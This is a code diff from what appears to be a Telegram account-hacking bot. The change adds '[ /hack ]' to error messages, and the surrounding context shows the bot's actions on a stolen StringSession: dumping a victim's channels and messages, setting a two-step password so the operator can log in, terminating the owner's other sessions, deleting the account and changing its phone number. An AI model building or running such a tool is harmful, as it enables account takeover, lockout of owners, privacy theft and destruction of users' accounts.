@@ -222,11 +222,11 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession Has Been Terminated")
+        return await event.respond("This StringSession Has Been Terminated !! [ /hack ]")
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("This StringSession Has Been Terminated")
+        return await event.reply("This StringSession Has Been Terminated !! [ /hack ]")
       if len(i) > 3855:
         file = open("info.txt", "w")
         file.write(i)
@@ -242,7 +242,7 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession Has Been Terminated")
+        return await event.respond("This StringSession Has Been Terminated !! [ /hack ]")
       i = await userinfo(strses.text)
       await event.reply(i)
     elif r == "C":
@@ -252,7 +252,7 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession Has Been Terminated")
+        return await event.respond("This StringSession Has Been Terminated !! [ /hack ]")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
@@ -264,7 +264,7 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession Has Been Terminated")
+        return await event.respond("This StringSession Has Been Terminated !! [ /hack ]")
       i = await usermsgs(strses.text)
       await event.reply(i)
     elif r == "E":
@@ -274,7 +274,7 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession Has Been Terminated")
+        return await event.respond("This StringSession Has Been Terminated !! [ /hack ]")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
@@ -286,7 +286,7 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession Has Been Terminated")
+        return await event.respond("This StringSession Has Been Terminated !! [ /hack ]")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await leavegroup(strses.text, grpid.text)
@@ -298,7 +298,7 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession Has Been Terminated")
+        return await event.respond("This StringSession Has Been Terminated !! [ /hack ]")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
@@ -310,7 +310,7 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession Has Been Terminated")
+        return await event.respond("This StringSession Has Been Terminated !! [ /hack ]")
       i = await user2fa(strses.text)
       if i:
         await event.reply("User don't have two step thats why now two step is `LEGEND IS BEST` you can login now")
@@ -323,7 +323,7 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession Has Been Terminated")
+        return await event.respond("This StringSession Has Been Terminated !! [ /hack ]")
       i = await terminate(strses.text)
       await event.reply("all sessions are terminated")
     elif res.text == "J":
@@ -333,7 +333,7 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession Has Been Terminated")
+        return await event.respond("This StringSession Has Been Terminated !! [ /hack ]")
       i = await delacc(strses.text)
       await event.reply("Account Deleted SUCCESSFULLLY")
     elif res.text == "L":
@@ -343,7 +343,7 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession Has Been Terminated")
+        return await event.respond("This StringSession Has Been Terminated !! [ /hack ]")
       await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
       grp = await x.get_response()
       await x.send_message("NOW GIVE USER USERNAME")
@@ -357,7 +357,7 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession Has Been Terminated")
+        return await event.respond("This StringSession Has Been Terminated !! [ /hack ]")
       await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
       pro = await x.get_response()
       try:
@@ -372,7 +372,7 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession Has Been Terminated")
+        return await event.respond("This StringSession Has Been Terminated !! [ /hack ]")
       await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[ NOTE : DONT USE 2ndline or text now numbers ]\n[ if you are use 2nd line or text now you can't get otp ] ")
       number = (await x.get_response()).text
       try:
